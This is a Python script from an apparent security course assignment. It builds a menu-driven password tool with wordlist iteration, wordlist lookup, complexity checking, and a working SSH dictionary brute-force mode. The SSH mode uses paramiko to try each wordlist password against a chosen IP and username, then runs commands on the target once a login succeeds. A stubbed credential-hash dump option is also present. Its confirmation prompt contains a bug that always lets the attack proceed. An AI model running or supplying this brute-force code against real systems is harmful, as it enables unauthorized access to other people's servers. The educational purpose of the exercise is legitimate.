# Script: 17 - Automated Brute Force Wordlist Attack Tool Part 2 of 3
# Author: Robert Gregor
# Date of latest revision: 09 MAY 23

# Objectives (PART I)
    # In Python, create a script that prompts the user to select one of the following modes:
        # Mode 1: Offensive; Dictionary Iterator
            # Accepts user input word list file path
                # Iterates through the word list, assigning the word being read to a variable.
            # Add a delay between words.
            # Print to the screen the value of the variable
        # Mode 2: Defensive; Password Recognized
            # Accepts a user input string.
            # Accepts a user input word list file path.
            # Search the word list for the user input string.
            # Print to the screen whether the string appeared in the word list.
        # Mode 3: Defensive; Password Complexity (STRETCH GOAL)
            # Accepts a user input string.
                # Evaluates the user input string for password complexity
            # Impose a requirement in your code for the below metrics:
                # Were at least [qty] characters used (password length)?
                # Were at least [qty] capital letter used?
                # Were at least [qty] numbers used?
                # Were at least [qty] symbols used?
            # Prints to the screen which of the above dimensions were satisfied by the user input password. 
                # If all dimensions are satisfied, print a clear SUCCESS indicator for the user.
# Objectives (PART II)
    # Add to your Python brute force tool the capability to:
        # Authenticate to an SSH server by its IP address
            # Assume the username and IP are known inputs
            # Attempt each word on the provided word list until successful login takes place
        # Dump user credential hashes of victim system and print to screen (STRETCH GOAL)

# Code Fellows Sources (PART I):
    # [Iterate over a set in Python](https://www.geeksforgeeks.org/iterate-over-a-set-in-python/)
    # [RockYou Password List](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz)
# Code Fellows Sources (PART II):
    # [How to Make an SSH Brute-Forcer in Python](https://null-byte.wonderhowto.com/how-to/sploit-make-ssh-brute-forcer-python-0161689/)
    # [How to Execute Shell Commands in a Remote Machine using Python](https://www.geeksforgeeks.org/how-to-execute-shell-commands-in-a-remote-machine-using-python-paramiko/)

# My Sources (PART I):
    # [With Open in Python – With Statement Syntax Example](https://www.freecodecamp.org/news/with-open-in-python-with-statement-syntax-example/)
    # [Python | os.path.isfile() method](https://www.geeksforgeeks.org/python-os-path-isfile-method/)
    # [os.path — Common pathname manipulations](https://docs.python.org/3/library/os.path.html)
    # [re.findall()](https://www.codecademy.com/resources/docs/python/regex/findall)
    # [Python Regex: re.search() VS re.findall()](https://www.geeksforgeeks.org/python-regex-re-search-vs-re-findall/)
# My Sources (PART II):
    # [Welcome to Paramiko!](https://www.paramiko.org/)
    # [Use Paramiko and Python to SSH into a Server](https://www.linode.com/docs/guides/use-paramiko-python-to-ssh-into-a-server/)

#!/usr/bin/env python

# Import libraries
import time, getpass, os, re
import paramiko, hashlib

def wordlist_iterate():
    # Accepts user input path to wordlist
    word_list = str(input("\nPlease enter the path to your word list (ex. /home/user/wordlist.txt)):\n"))
    # With statement opens word_list file in read mode as file
    with open(word_list, 'r') as file:
        # For loop iterates through each line in word_list
        for line in file:
            # Removes leading and trailing white space, breaks line into list of words
            passwords = line.strip().split()
            # For loop iterates through each password in passwords list
            for password in passwords:
                # Assigns current password read to variable
                variable = password
                # One second delay
                time.sleep(1)
                print()
                # Prints current password to screen
                print(variable)
                
def recog_passwd():
    # Accepts user input for word list and password to query
    word_list = str(input("\nPlease enter the path to your word list (ex. /home/user/wordlist.txt)):\n"))
    user_passwd = str(input("\nPlease enter the password you would like to query:\n"))
    # Conditional determines if word list file exists
    if os.path.isfile(word_list):
        # With statement opens word_list file in read mode as file
        with open(word_list, 'r') as file:
            # For loop iterates through each line in word_list
            for line in file:
                # Removes leading and trailing white space, breaks line into list of words 
                passwords = line.strip().split()
                # Conditional determines if user_password is in user provided word list
                if user_passwd in passwords:
                    print(f"\nPassword '{user_passwd}' was found in the {word_list} word list")
                    break
            else:
                print(f"\nPassword '{user_passwd}' was not found in the {word_list} word list")

def complex_passwd():
    user_passwd = str(input("\nPlease enter the password you would like to verify meets complexity requirements:\n"))
    # Declare variables for password requirements
    min_length = 8
    min_capital_letters = 2
    min_numbers = 2
    min_special_characters = 2

    # Conditional uses len function to determine if password length meets requirements
    if len(user_passwd) >= min_length:
        print("\nPassword length: Satisfied")
    else:
        print(f"Password length: Not satisfied (minimum {min_length} characters)")

    # re.findall function counts how many capital letters are found in user_passwd
    capital_letters = re.findall(r'[A-Z]', user_passwd)
    # Conditional used to determine if number of capital letters used meets requirements
    if len(capital_letters) >= min_capital_letters:
        print(f"Minimum of {min_capital_letters} capital letters: Satisfied")
    else:
        print(f"Minimum of {min_capital_letters} capital letters: Not satisfied")

    # re.findall function counts how many numbers are found in user_passwd
    numbers = re.findall(r'\d', user_passwd)
    # Conditional used to determine if number of numbers used meets requirements
    if len(numbers) >= min_numbers:
        print(f"Minimum of {min_numbers} numbers: Satisfied")
    else:
        print(f"Minimum of {min_numbers} numbers: Not satisfied")

    # re.findall function counts how many specified special characters are found in user_passwd
    special_characters = re.findall(r'[!@#$%^&*(),.?":{}|<>]', user_passwd)
    # Conditional used to determine if number of special characters used meets requirements
    if len(special_characters) >= min_special_characters:
        print(f"Minimum of {min_special_characters} special characters: Satisfied")
    else:
        print(f"Minimum of {min_special_characters} special characters: Not satisfied")

    # Conditional determines if all requirements are met using boolean logic
    if (len(user_passwd) >= min_length and
        len(capital_letters) >= min_capital_letters and
        len(numbers) >= min_numbers and
        len(special_characters) >= min_special_characters):
        print("\nSUCCESS! YOU HAVE MET PASSWORD COMPLEXITY REQUIREMENTS!")

def ssh_auth():
    # Accepts user input for word list and password to query
    ssh_ip = str(input("\nPlease enter the IP address of the system you would like to SSH into:\n"))
    ssh_username = str(input("\nPlease enter the user name for the SSH login:\n"))
    word_list = str(input("\nPlease enter the path to the word list you would like to use (ex. /home/user/wordlist.txt)):\n"))
    
    # Verifies user wants to execute dictionary attack with given input parameters
    print(f"\nIP Address: {ssh_ip}")
    print(f"Username: {ssh_username}")
    print(f"Wordlist file path: {word_list}")
    print("----------------------------------------------------")
    exe_bf_att = input("\nAbove are the parameters you selected, are you sure you would like to proceed? (y/n)? ")
    
    # Conditional determines execution
    if exe_bf_att == "Y" or "y":
        # Conditional determines if word list file exists 
        if os.path.isfile(word_list):
            # With statement opens file in read mode 
            with open(word_list, "r") as file:
                # For loop iterates through each password in word list
                for line in file:
                    # Removes leading and trailing white space, breaks line into list of words
                    passwd = line.strip()
                    # Sets up SSH client with paramiko python library
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    
                    try:
                        # Tries to make SSH connection with given input parameters and current password
                        time.sleep(1)
                        ssh.connect(ssh_ip, username=ssh_username, password=passwd)
                        print(f"Password Found!: {passwd}\n")
                        # If SSH connection is successful executes basic linux commands to verify
                        stdin, stdout, stderr = ssh.exec_command("whoami")
                        time.sleep(3)
                        output = stdout.read()
                        print("--------------")
                        print("whoami command")
                        print("--------------")
                        print(output)
                        print()
                        stdin, stdout, stderr = ssh.exec_command("ls -l")
                        time.sleep(3)
                        output = stdout.read()
                        print("-------------")
                        print("ls -l command")
                        print("-------------")
                        print(output)
                        print()
                        stdin, stdout, stderr = ssh.exec_command("uptime")
                        time.sleep(3)
                        output = stdout.read()
                        print("--------------")
                        print("uptime command")
                        print("--------------")
                        print(output)
                        # Closes SSH connection
                        ssh.close()
                        return
                    # If SSH connection unsuccessful, notify user, and attempt next password in list
                    except paramiko.AuthenticationException as e:
                        print(f"\nIncorrect Password: {passwd}")

            # Notify user password not found in word list
            print("Apologies, couldn't crack password.")

def dump_hashes():
    exit()

while True:
      
        print("\n------------------------")
        print("Please choose an option:")
        print("------------------------")
        print("1) List all passwords in word list\n2) Password in word list?\n3) Password complexity evaluation\n4) Brute force SSH access\n5) Dump system hashes\nexit) Exits program")
        user_option = str(input("------------------------\n"))

        if user_option == "1":
            wordlist_iterate()
        elif user_option == "2":
            recog_passwd()
        elif user_option == "3":
            complex_passwd()
        elif user_option == "4":
            ssh_auth()
        elif user_option == "5":
            dump_hashes()
        elif user_option == "exit":
            print("\nExited successfully!\n")
            exit()
        else:
            print("\nInvalid input please try again!")
            continue

